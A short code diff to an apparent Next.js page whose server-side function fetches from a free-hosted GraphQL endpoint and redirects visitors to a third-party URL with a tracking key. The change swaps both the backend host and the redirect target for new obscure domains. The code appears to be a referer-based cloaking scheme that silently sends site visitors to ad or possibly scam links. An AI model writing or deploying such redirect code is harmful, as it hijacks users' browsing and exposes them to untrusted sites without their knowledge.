@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://kaxhi.000webhostapp.com/graphql"
+	const endpoint = "https://2ndaxx.000webhostapp.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -18,7 +18,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					` https://mosqueworking.com/uzu13btb?key=fda547c3b96184db3f0c8f0488fa9b88`
+					` https://broadsheetspikesnick.com/xxwgin3jg?key=bb0a5d2b0552dc54c1a514ddbf712848`
 				}`,
 			},
 		};
